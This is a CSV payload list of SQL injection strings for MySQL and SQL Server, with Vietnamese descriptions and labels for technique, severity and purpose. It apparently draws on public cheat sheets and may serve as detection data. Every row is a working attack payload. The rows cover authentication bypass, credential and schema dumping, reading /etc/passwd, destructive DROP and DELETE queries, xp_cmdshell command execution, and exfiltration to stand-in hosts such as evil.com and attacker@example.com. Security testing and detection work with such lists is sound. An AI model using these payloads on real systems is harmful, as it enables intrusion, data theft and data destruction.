payload,type,technique,dbms,severity,purpose,description,source
admin' -- ,In-band,UNION-based,SQL Server,Thấp,Truy cập trái phép,Đăng nhập với tên 'admin' mà không cần mật khẩu,PortSwigger Web Security Academy
') OR ('1'='1,In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Bypass đăng nhập trong trường hợp truy vấn có cấu trúc khác,OWASP SQL Injection Prevention Cheat Sheet
1' ORDER BY 10 -- -,In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Xác định số cột bằng ORDER BY,PortSwigger Web Security Academy
1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() -- -,In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Liệt kê tất cả các bảng trong cơ sở dữ liệu hiện tại,HackTricks SQL Injection Guide
"1' UNION SELECT NULL,NULL,NULL,CONCAT(table_schema,'.',table_name) FROM information_schema.tables -- -",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Liệt kê tất cả các bảng trên tất cả cơ sở dữ liệu,Pentestmonkey MySQL Injection Cheat Sheet
1; BACKUP DATABASE master TO DISK='\\attackerserver\share\backup.bak' -- ,In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Sao lưu cơ sở dữ liệu ra bên ngoài,Pentestmonkey SQL Server Injection Cheat Sheet
1; SELECT * FROM master..sysdatabases -- ,In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Liệt kê tất cả các cơ sở dữ liệu,HackTricks SQL Injection Guide
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='mysql')>1 -- -,Blind,Boolean-based,MySQL,Cao,Truy cập trái phép,Xác nhận số lượng bảng trong schema mysql,PortSwigger Web Security Academy
' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%')>0 -- -,Blind,Boolean-based,MySQL,Cao,Truy cập trái phép,Xác định có username bắt đầu bằng 'a' hay không,HackTricks SQL Injection Guide
' OR 1=1--,In-band,Boolean-based,MySQL,Trung bình,Truy cập trái phép,Tận dụng điều kiện luôn đúng để truy cập trái phép hoặc kiểm thử tính hợp lệ của câu truy vấn.,Invicti SQL Injection Cheat Sheet
' AND 1=0--,In-band,Boolean-based,MySQL,Trung bình,Truy cập trái phép,Tận dụng điều kiện luôn đúng để truy cập trái phép hoặc kiểm thử tính hợp lệ của câu truy vấn.,Invicti SQL Injection Cheat Sheet
1 OR 1=1--,In-band,Boolean-based,MySQL,Trung bình,Truy cập trái phép,Sử dụng biến thể Boolean-based không dùng ký tự đặc biệt để xác thực luôn đúng.,Invicti SQL Injection Cheat Sheet
' OR 'x'='x--,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,Điều kiện chuỗi luôn đúng (x = x) để bypass xác thực.,Invicti SQL Injection Cheat Sheet
' OR 'a'='a--,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,Điều kiện chuỗi luôn đúng (a = a) dùng để tìm lỗi SQLi.,Invicti SQL Injection Cheat Sheet
' OR 1=1#,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,"Sử dụng ký tự '#' để comment kết thúc truy vấn, điều kiện OR 1=1 luôn đúng.",Invicti SQL Injection Cheat Sheet
' OR 1=1/*,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,Sử dụng comment kiểu C (/* */) kết thúc truy vấn với OR 1=1.,Invicti SQL Injection Cheat Sheet
' OR USER() LIKE 'r%'--,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,"So sánh thông tin người dùng, tận dụng lỗ hổng để xác minh điều kiện.",PortSwigger Web Security Academy SQLi Cheatsheet
"' OR SUBSTRING(USER(),1,1)='r'--",In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,Trích xuất kí tự đầu tên đăng nhập qua lệnh điều kiện.,PortSwigger Web Security Academy SQLi Cheatsheet
"' UNION SELECT 1,2,3--",In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Union đơn giản với 3 cột để tìm hiểu số cột của bảng.,HackTricks - Pentesting SQL Injection
"' UNION SELECT 1, USER(), DATABASE()--",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Dùng UNION để trích xuất tên người dùng và tên cơ sở dữ liệu.,HackTricks - Pentesting SQL Injection
"' UNION SELECT 1,@@version--",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Union lấy phiên bản máy chủ cơ sở dữ liệu.,HackTricks - Pentesting SQL Injection
"' AND 1=0 UNION SELECT username,password FROM users--",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Bypass chọn dữ liệu từ bảng users bằng UNION sau điều kiện sai.,HackTricks - Pentesting SQL Injection
"' UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)--",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Union danh sách tên bảng (group_concat) từ information_schema.,HackTricks - Pentesting SQL Injection
"' UNION SELECT NULL,NULL--",In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,"Union thay thế NULL cho mọi cột, dùng thử nhiều cột truy vấn.",HackTricks - Pentesting SQL Injection
"0' UNION SELECT 1,2--",In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Union injection thử nghiệm với 2 cột.,HackTricks - Pentesting SQL Injection
"0' UNION SELECT DATABASE(),NULL--",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Union lấy tên database hiện tại.,HackTricks - Pentesting SQL Injection
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Union dùng LOAD_FILE để đọc file hệ thống (chỉ đọc được file toàn cục).,PentestMonkey MySQL SQLi Cheat Sheet
"' UNION SELECT 1,current_user()--",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Union lấy thông tin user hiện tại.,HackTricks - Pentesting SQL Injection
"' UNION SELECT 1,(SELECT GROUP_CONCAT(name) FROM master.sys.databases)--",In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Union liệt kê cơ sở dữ liệu trên SQL Server.,PentestMonkey MySQL SQLi Cheat Sheet
"0' UNION SELECT @@version,NULL--",In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Union lấy phiên bản SQL Server.,PentestMonkey MySQL SQLi Cheat Sheet
1' UNION SELECT CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)--,In-band,UNION-based,SQL Server,Trung bình,Truy cập trái phép,Union dùng hàm CHAR ghép ra chuỗi 'user'.,PentestMonkey MySQL SQLi Cheat Sheet
"' UNION SELECT NAME,1 FROM master..syslogins--",In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Union lấy tên đăng nhập từ syslogins.,PentestMonkey MySQL SQLi Cheat Sheet
"' UNION SELECT 1,2,3--",In-band,UNION-based,SQL Server,Trung bình,Truy cập trái phép,Union đơn giản để thử nghiệm nhiều cột trên SQL Server.,PentestMonkey MySQL SQLi Cheat Sheet
"1' UNION SELECT 1,2,3--",In-band,UNION-based,SQL Server,Trung bình,Truy cập trái phép,Union đơn giản để xác định số cột.,PentestMonkey MySQL SQLi Cheat Sheet
' AND 1=0 HAVING 1=1--,In-band,Error-based,MySQL,Trung bình,Truy cập trái phép,Error-based: ép HAVING gây lỗi để tìm số cột hoặc thông tin.,Invicti SQL Injection Cheat Sheet
"1 OR 1=CONVERT(int,@@version)--",In-band,Error-based,SQL Server,Trung bình,Truy cập trái phép,Error-based SQLi: ép SQL Server phân tích giá trị gây lỗi hiển thị thông tin.,HackTricks - MSSQL Injection
1' + USER_NAME(@@VERSION)--,In-band,Error-based,SQL Server,Trung bình,Truy cập trái phép,Error-based SQLi: tận dụng USER_NAME() để gây lỗi và lộ thông tin.,HackTricks - MSSQL Injection
1; DROP TABLE users--,In-band,Stacked Queries,MySQL,Cao,Xóa dữ liệu,Stacked query: DROP TABLE xóa bảng dữ liệu.,Invicti SQL Injection Cheat Sheet
1; DELETE FROM orders--,In-band,Stacked Queries,MySQL,Cao,Xóa dữ liệu,Stacked query: DELETE FROM xóa dữ liệu từ bảng.,Invicti SQL Injection Cheat Sheet
'; UPDATE users SET admin=1--,In-band,Stacked Queries,MySQL,Cao,Sửa đổi dữ liệu,Stacked query: thay đổi quyền user qua UPDATE.,Invicti SQL Injection Cheat Sheet
'; INSERT INTO users(name) VALUES('test')--,In-band,Stacked Queries,MySQL,Trung bình,Sửa đổi dữ liệu,Stacked query: chèn một bản ghi mới vào users.,Invicti SQL Injection Cheat Sheet
'; CREATE TABLE hacktest(id int)--,In-band,Stacked Queries,MySQL,Cao,Thực thi lệnh hệ thống,Stacked query: tạo bảng mới trên hệ thống.,Invicti SQL Injection Cheat Sheet
1; EXEC xp_cmdshell 'whoami'--,In-band,Stacked Queries,SQL Server,Cao,Thực thi lệnh hệ thống,Stacked query trên SQL Server: dùng xp_cmdshell thực thi lệnh OS.,PentestMonkey MySQL SQLi Cheat Sheet
1; DROP TABLE members--,In-band,Stacked Queries,SQL Server,Cao,Xóa dữ liệu,Stacked query: DROP TABLE xóa bảng members.,PentestMonkey MySQL SQLi Cheat Sheet
1; UPDATE members SET password='pw'--,In-band,Stacked Queries,SQL Server,Cao,Sửa đổi dữ liệu,Stacked query: thay đổi mật khẩu của user.,PentestMonkey MySQL SQLi Cheat Sheet
1; INSERT INTO members(login) VALUES('a')--,In-band,Stacked Queries,SQL Server,Trung bình,Sửa đổi dữ liệu,Stacked query: thêm người dùng mới trong bảng members.,PentestMonkey MySQL SQLi Cheat Sheet
1; DELETE FROM members--,In-band,Stacked Queries,SQL Server,Cao,Xóa dữ liệu,Stacked query: xóa dữ liệu trong bảng members.,PentestMonkey MySQL SQLi Cheat Sheet
1; CREATE TABLE hack (id int)--,In-band,Stacked Queries,SQL Server,Cao,Thực thi lệnh hệ thống,Stacked query: tạo bảng hack trên SQL Server.,PentestMonkey MySQL SQLi Cheat Sheet
' OR SLEEP(5)--,Blind,Time-based,MySQL,Trung bình,Truy cập trái phép,Time-based SQLi: SLEEP(5) trì hoãn phản hồi khi điều kiện đúng.,PayloadBox SQL Injection Payload List
"' OR IF(1=1,SLEEP(5),0)--",Blind,Time-based,MySQL,Trung bình,Truy cập trái phép,"Time-based SQLi: IF điều kiện đúng chạy SLEEP, giúp nhận biết lỗ hổng.",PayloadBox SQL Injection Payload List
"' OR BENCHMARK(5000000,MD5('a'))--",Blind,Time-based,MySQL,Trung bình,Truy cập trái phép,Time-based SQLi: dùng BENCHMARK tạo độ trễ.,PayloadBox SQL Injection Payload List
' AND SLEEP(5)--,Blind,Time-based,MySQL,Thấp,Truy cập trái phép,Time-based SQLi: thêm điều kiện SLEEP để tạo chậm trễ.,PayloadBox SQL Injection Payload List
' OR SLEEP(10)--,Blind,Time-based,MySQL,Trung bình,Truy cập trái phép,Time-based SQLi: SLEEP(10) làm chậm phản hồi.,PayloadBox SQL Injection Payload List
' OR SLEEP(3)--,Blind,Time-based,MySQL,Thấp,Truy cập trái phép,Time-based SQLi: SLEEP ngắn cho blind injection.,PayloadBox SQL Injection Payload List
'; WAITFOR DELAY '00:00:05'--,Blind,Time-based,SQL Server,Trung bình,Truy cập trái phép,Time-based SQL Server: WAITFOR DELAY 5 giây.,PayloadBox SQL Injection Payload List
"""; WAITFOR DELAY '00:00:05'--",Blind,Time-based,SQL Server,Trung bình,Truy cập trái phép,"Time-based SQL Server: ký tự "" kết hợp với WAITFOR.",PayloadBox SQL Injection Payload List
' OR 1=1; WAITFOR DELAY '00:00:05'--,Blind,Time-based,SQL Server,Trung bình,Truy cập trái phép,Time-based SQL Server: OR 1=1 và WAITFOR để kiểm thử.,PayloadBox SQL Injection Payload List
' OR 1=1; WAITFOR DELAY '00:00:10'--,Blind,Time-based,SQL Server,Trung bình,Truy cập trái phép,Time-based SQL Server: OR và WAITFOR 10 giây.,PayloadBox SQL Injection Payload List
' OR 1=1 WAITFOR DELAY '00:00:10'--,Blind,Time-based,SQL Server,Trung bình,Truy cập trái phép,Time-based SQL Server: OR và WAITFOR 10 giây.,PayloadBox SQL Injection Payload List
'; WAITFOR DELAY '00:00:10'--,Blind,Time-based,SQL Server,Trung bình,Truy cập trái phép,Time-based SQL Server: ký tự ';' và WAITFOR.,PayloadBox SQL Injection Payload List
1 AND 1=1--,Blind,Boolean-based,MySQL,Thấp,Truy cập trái phép,"Boolean-based số: 1=1 TRUE, dùng trong blind SQLi.",Invicti SQL Injection Cheat Sheet
1 AND 1=0--,Blind,Boolean-based,MySQL,Thấp,Truy cập trái phép,"Boolean-based số: 1=0 FALSE, dùng để kiểm thử blind SQLi.",Invicti SQL Injection Cheat Sheet
1 OR 1=1#,Blind,Boolean-based,SQL Server,Thấp,Truy cập trái phép,Boolean-based với comment #: 1=1 TRUE.,PentestMonkey MSSQL SQLi Cheat Sheet
1 OR 1=0#,Blind,Boolean-based,SQL Server,Thấp,Truy cập trái phép,Boolean-based với comment #: 1=0 FALSE.,PentestMonkey MSSQL SQLi Cheat Sheet
1' OR 1=1#,Blind,Boolean-based,SQL Server,Thấp,Truy cập trái phép,"Boolean-based trên SQL Server, bypass luôn đúng.",PentestMonkey MSSQL SQLi Cheat Sheet
0 OR 0=0--,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,"Boolean số: 0=0 TRUE, tránh quote để bypass.",Invicti SQL Injection Cheat Sheet
0 AND 1=0--,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,Boolean số: 1=0 FALSE.,Invicti SQL Injection Cheat Sheet
1; EXEC master..xp_dirtree '\evil.com\share'--,Out-of-band,Out-of-band,SQL Server,Cao,Truy cập trái phép,Out-of-band: xp_dirtree trên SQL Server kết nối đến máy chủ khác.,PentestMonkey MSSQL SQLi Cheat Sheet
1; BULK INSERT hack FROM 'C:\\temp\\data.txt'--,Out-of-band,Out-of-band,SQL Server,Cao,Truy cập trái phép,Out-of-band: BULK INSERT lấy dữ liệu từ file share.,PentestMonkey MSSQL SQLi Cheat Sheet
1; LOAD DATA INFILE 'C:/xampp/htdocs/shell.php' INTO TABLE users--,Out-of-band,Out-of-band,MySQL,Cao,Thực thi lệnh hệ thống,Out-of-band: LOAD DATA tạo file trên server.,HackTricks - Out-of-band Exploitation
1; SELECT LOAD_FILE('\\evil.com\\share\\file')--,Out-of-band,Out-of-band,MySQL,Cao,Truy cập trái phép,Out-of-band: LOAD_FILE tạo request tới \evil.com\share.,HackTricks - Out-of-band Exploitation
' OR 1=1; SELECT LOAD_FILE('\\evil.com\\a.txt')--,Out-of-band,Out-of-band,MySQL,Cao,Truy cập trái phép,Out-of-band: kết hợp SQLi và LOAD_FILE exfil dữ liệu qua mạng.,HackTricks - Out-of-band Exploitation
"' OR 1=1; EXEC msdb.dbo.sp_send_dbmail @profile_name='DBMail',@recipients='attacker@example.com',@query='SELECT * FROM users'--",Out-of-band,Out-of-band,SQL Server,Cao,Truy cập trái phép,Out-of-band: sử dụng sp_send_dbmail gửi dữ liệu qua email.,PentestMonkey MSSQL SQLi Cheat Sheet
1; SELECT * FROM (SELECT(SLEEP(5)))a--,Blind,Time-based,MySQL,Cao,Truy cập trái phép,Blind time-based: sử dụng SELECT SLEEP để đo độ trễ.,PayloadBox SQL Injection Payload List
1; WAITFOR DELAY '00:00:05'--,Blind,Time-based,SQL Server,Cao,Truy cập trái phép,Blind time-based: WAITFOR DELAY 5s trên SQL Server.,PayloadBox SQL Injection Payload List
0 WAITFOR DELAY '00:00:05'--,Blind,Time-based,SQL Server,Cao,Truy cập trái phép,Blind time-based: WAITFOR DELAY để đo thời gian phản hồi.,PayloadBox SQL Injection Payload List
